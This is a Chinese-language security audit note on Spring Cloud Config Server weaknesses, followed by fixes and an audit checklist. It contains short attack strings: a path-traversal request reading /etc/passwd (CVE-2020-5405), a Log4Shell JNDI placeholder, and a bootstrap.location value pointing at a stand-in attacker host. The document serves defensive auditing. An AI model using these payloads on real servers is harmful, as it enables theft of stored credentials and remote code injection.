# Spring Cloud Config Server 敏感信息泄漏与 JNDI 注入

## 攻击面

Config Server 集中管理所有服务的配置，被打穿 = 拿到全套数据库密码 / 密钥。

### 1. 未鉴权访问

默认无认证，任何人可访问：

```
GET /application/default        # 全局 default profile
GET /myapp/prod                  # myapp 服务 prod profile
GET /myapp/default/master        # 从 master 分支拉配置
```

### 2. Git 仓库 URI SSRF

`spring.cloud.config.server.git.uri` 可以是任意 URL。若允许通过 API 动态指定
（部分早期版本 `POST /monitor` 或自定义 EnvironmentRepository）→ SSRF。

### 3. CVE-2020-5405 路径穿越

Config Server ≤ 2.2.2 允许通过 URI 逃逸出 Git 仓库读取任意文件：

```
GET /foo/default/master/..%2F..%2F..%2Fetc%2Fpasswd
```

### 4. `${}` 属性占位符 JNDI 注入

Bootstrap / Application 配置文件中支持 `${...}` 占位符。若客户端从 Config Server
拉取的配置进入 log4j2 版本 ≤ 2.14.1 的日志系统，`${jndi:ldap://...}` 触发 Log4Shell。

Config Server 本身若日志记录客户端请求 label/profile 且用 log4j2，同样中招。

### 5. Bootstrap.location 加载远程配置

`spring.cloud.bootstrap.location=http://attacker/bootstrap.yml` 若可通过环境变量
或命令行注入，攻击者可注入任意 bean 配置。

## 修复

### 加鉴权
```yaml
spring:
  security:
    user:
      name: config-admin
      password: ${CONFIG_PWD}      # 从 env 注入，不写代码
```

### 加密敏感值
```
POST /encrypt
value_to_encrypt
```

配置文件写 `{cipher}xxxxx`，Config Server 用 `encrypt.key` 或 KMS 解密。

### 网络隔离
Config Server 只监听内网，不暴露公网。

### 版本升级
- Spring Cloud Config ≥ 2.2.3（修复 CVE-2020-5405）
- Spring Cloud Config ≥ 3.0.4（修复 CVE-2020-5410）

## 审计动作

- [ ] `spring.cloud.config.server.git.uri` 是否 HTTPS 私仓 + PAT / SSH key
- [ ] Config Server 是否加了 Spring Security
- [ ] `spring.profiles.active` 客户端是否可控
- [ ] Config Server 日志组件版本
- [ ] 加密配置比例（`{cipher}` 前缀）

## 相关规则

- CWE: CWE-200, CWE-306
- 内建 pattern: `spring_cloud_misconfig`
